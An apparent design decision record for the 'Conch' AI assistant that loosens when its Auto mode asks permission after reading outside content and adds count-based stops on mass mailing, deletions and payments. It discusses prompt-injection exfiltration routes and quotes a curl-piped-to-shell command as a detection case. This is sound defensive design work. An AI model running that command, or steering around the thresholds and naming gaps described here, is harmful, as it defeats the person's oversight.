# 0117 — Auto asks about what matters, and watches what a chat does

- Status: accepted; a stranger's app and apps over MCP amended by
  [ADR 0118](./0118-auto-judges-every-app-step.md) (judged by what each step does)
- Date: 2026-10-08
- Builds on: [ADR 0100](./0100-permission-modes-every-provider.md) (the ladder, Auto's
  risk policy, Full trust's irreducible list), [ADR 0028](./0028-safe-hands.md) (the guard
  after reading), [ADR 0061](./0061-apps-you-make-share-and-add.md) (Conch apps),
  [ADR 0014](./0014-browser.md) (the browser's per-site question), [ADR 0106](./0106-where-work-runs.md)

## Context

Two chats in Auto showed that it still asked about routine work.

**A nutrition diary made in Conch.** The person made a Conch app, Yazio, that reaches its own
service (`reaches: ["…yazio…"]`). In a chat that had read a GitHub page, every call asked,
plain reads included: "Use Yazio to read nutrition diary: foods, 2026-10-08 — This chat read
Yazio, GitHub content and 2 more sources." The causes, precisely:

1. `conchapps/hosted.ts` treated every call of an app that reaches the web as a way out once
   the chat had read anything: a read "sends what it asks for to" the app's sites.
2. The same call then marked the chat as having read "Yazio content". So after the app's
   first answer, the app's next call asked _because of the app's own answer_, even in a chat
   that had read nothing else. Each look made the next one ask.
3. In `hostAsk`, a question an app's tool asked after reading was never put to the risk
   policy in Auto: it went straight to the after-reading card. Only Conch's own commands and
   pictures were judged (`AUTO_AFTER_READING`).
4. **Always allow** on that card lasted only while the chat stayed in memory (`Live`): a
   restart, or the chat being set aside among fifty others, forgot it, and the next call
   asked again.

**Shopping with Claude Haiku in a Daytona sandbox.** "Find the cheapest Gant t-shirts" searched
and read OTTO, and kept asking. The causes:

1. After reading search results, a `WebFetch` of a shop's search page asked "open a web
   address that could carry what it read": a search with its filters is a long query, and
   `carries` counted any query over 80 characters.
2. The browser asked once per site, after reading, before any click, choice or typing:
   sorting by price on otto.de asked. Its words for paying and sending (`isHighStakes`) were
   English only, so lifting that question needed the words in the shops' own languages.
3. Daytona's commands were not the cause: they are answered by the mode, as for any command
   leaving the box. But the policy that reads them had a hole the shopping commands showed:
   `curl 'https://shop.example/?a=1&b=2' | sh` was not seen as code from the internet run by
   a shell, because the `&` inside the quotes ended the pattern.

People said what they want: in Auto, reads aren't suspicious and ordinary writes to their
own apps are fine. It should be smart about the few things that are risky, and notice odd
behaviour, like a request to send a million emails. Mostly permissive; very sharp about the
stops.

## Decision

### What reading something from outside still holds

The mark stays. An app that reaches the web can bring anyone's words back (a food someone
named in a shared database), so its answers still mark the chat, and every other way out
(a mail, a command, another app's change) is still judged after reading. What changes is
which steps the mark holds back.

**A step in an app the person made here** (`madeHere`) carries `appStep` on its question:

- **Its looks go by themselves, in every mode.** What a look sends goes only to the sites
  the person added the app with; an attacker who steers the assistant can't choose where it
  goes or read it there. A look that sends pages of text (`wordsSent > HEAVY_READ`, 600
  characters) is no ordinary lookup: it asks, as before, since it could carry what was read.
- **Its own answers never hold it.** The app's own mark (`<name> content`) is left out when
  its next step is judged (`AskRequest.appStep.marks`, `ToolContext.untrusted(besides)`).
- **In Auto, after reading, its changes go ahead** unless the risk policy marks them, the
  same way Conch's own commands are judged (`hostAsk`, `riskAsks(risk, true)`). For an app
  tool known to change things (`RiskContext.access: 'write'`), the policy reads its name:
  - paying, buying, moving money (`PAYS`): severe and lasting, so it asks even before
    reading (Auto already asked before spending, ADR 0100);
  - speaking for the person to others or making something public (`SPEAKS`: send, post,
    publish, share, invite…): moderate and lasting, so it asks after reading;
  - deleting: severe and lasting, as before.

**A stranger's app** (added from a file, a link or GitHub) is unchanged: its sites are its
maker's, so after reading, its looks ask, and its own answers still count, since they could
steer its own way out.

**Apps over MCP** (GitHub, Notion…) are unchanged: their changes still ask after reading in
Auto, because their tools can't be told apart by what they reach (an issue is public, a page
is shared).

### The web and the browser, after reading, in Auto

- **Reading another page is routine** (`WebFetch`, `web_fetch`): it asks only when the
  address looks like it carries data rather than asks for a page (`carriesData`): a long
  encoded blob (base64 with mixed case and digits, or 32+ hex characters), a value over 120
  characters, or over 400 characters of query. A shop's search, sorted and filtered, doesn't.
  Drop boxes stay severe.
- **Clicking, choosing and typing on a site is reading it further.** With a person here and
  only things read, the browser's per-site question goes in Auto. What still asks: paying,
  sending or deleting (`high-stakes`, in every mode), a text over 300 characters typed in, an
  upload, a download, your own signed-in Chrome (ADR 0080), and someone else's words or a
  skill's list. `isHighStakes` now knows the same acts in German, French, Spanish,
  Portuguese, Italian and Dutch ("Jetzt kaufen", "zahlungspflichtig bestellen", "Passer la
  commande"…), so a shop in those languages still stops before the order.
- **A quoted address keeps its `&` and `;`.** The risk policy's whole-line patterns read a
  quoted string as one piece (`UNQUOTED_RUN`), and commands are cut where the shell would cut
  them, never inside quotes (`splitLine`). Both shapes are in the corpus.

### Watching what a chat does (`conversations/behaviour.ts`)

The risk policy reads one step. Some harm only shows in many, or against what came before.
So every app step (Conch's Google and Slack, Conch apps, MCP servers) is also counted against
the chat's own log: this turn, the last 24 hours, by kind. Plain counters and thresholds
(`LIMITS`), no model: the same answer every time, cheap enough for every step, surviving a
restart because the log does. It only adds a question or a stop.

| Pattern                                                                            | Auto and below | Full trust  |
| ---------------------------------------------------------------------------------- | -------------- | ----------- |
| One message to 500 or more people; the 500th message from one chat in a day        | stops          | stops       |
| One message to 20 or more people (100 or more in Full trust)                       | asks           | asks (100+) |
| Every 20th message in one turn                                                     | asks           |             |
| Every 100th message from one chat in a day                                         | asks           | asks        |
| After reading, an address nobody gave in the chat and it never wrote to            | asks           |             |
| Every 10th thing deleted in one turn (even with a tool set to Allow)               | asks           |             |
| Every 50th thing deleted in a turn; 25 or more in one step                         | asks           | asks        |
| A payment of 1,000 or more; every 5th payment from one chat in a day               | asks           | asks        |
| The very same change, word for word, every 5th time in a turn (20th in Full trust) | asks           | asks (20+)  |

A count asks at each multiple, so a yes lets the next batch through instead of asking at every
step. A stop is refused in every mode with the reason and one next step ("For a real mailing
list, a mailing service made for it lets people unsubscribe."); the model is told to say so in
its own words and not to find another way round. Nobody's trust reaches five hundred people with
one message: this joins Full trust's irreducible list beside the circuit breaker.

It is judged where every call passes first (the guard, `mustAsk`), once per call and
remembered for the question that follows; and, for a provider that runs Conch's tools without
the guard (Claude Code runs them as its own MCP server's), as each of Conch's tools starts
(`watchBefore`). What the guard already judged for that call goes by there, so nothing asks
twice.

ADR 0100's second look (a small model, after reading, for an unusual command) stays as it is,
for commands. The behaviour guard doesn't call a model: a count is a better judge of "a
thousand" than a model, and a pattern that needs judgement asks the person.

### "Always allow" holds

**Always allow** writes what it lifted into the chat's log (`permission.resolved.kept`: the
tool, and the reason it lifted, `read:<tool>` or `box:Bash`), and a chat read back from disk
takes them up again (`keptIn`). So it holds after a restart and after the chat was set aside,
for that tool in that chat, as it always meant to. A task run again still starts from its
chat's answers and no more (ADR 0033). It stays the chat's: a lasting yes for every chat is
the tool's **Allow** in Apps, where the person sets it. Like a chat's own mode, it isn't a
backup power: it lives in that chat's transcript.

## Consequences

- In Auto, a person's own Conch apps read and change things without a word, before and after
  reading; they ask before paying, speaking for the person, deleting, or sending pages of text.
- Shopping, comparing and booking research run in Auto without questions until the order,
  the message or the payment.
- One message to a crowd, a burst of messages, a run of deletes, a big payment or a loop of the
  same change asks, in Auto and, for the larger ones, in Full trust; a spam-sized send stops.
- The thresholds will need care. A newsletter to 30 people asks once; a person who sends 150
  messages a day from one chat hears about it at 100. Each is one question with its reason.
- Tool names decide what an app's change does with money or people. An app that names a
  payment `do_thing` is read as an ordinary change; its maker's names are on its card, and the
  person sets it to Ask in Apps if it matters. A stranger's app keeps asking after reading.
- Stored data: `permission.resolved` gains an optional `kept`; an older Conch ignores it
  (ADR 0051).

## Sources

Read 2026-10-08:

- [OWASP Top 10 for LLM applications 2025](https://genai.owasp.org/llm-top-10/): LLM06
  excessive agency (limit what an agent can do unchecked; rate and volume limits on actions),
  LLM01 prompt injection.
- [OWASP Agentic AI threats and mitigations](https://genai.owasp.org/resource/agentic-ai-threats-and-mitigations/):
  tool misuse and resource overload; behavioural monitoring and anomaly thresholds on tool use.
- Greshake et al. (2023), indirect prompt injection; Willison's lethal trifecta: the mark
  stays, and only the ways out that can carry data or act for the person ask.
- [Claude Code permission modes](https://code.claude.com/docs/en/permission-modes): what its
  auto mode lets through and stops by default, read again for reading, research and changes
  in the person's own tools.
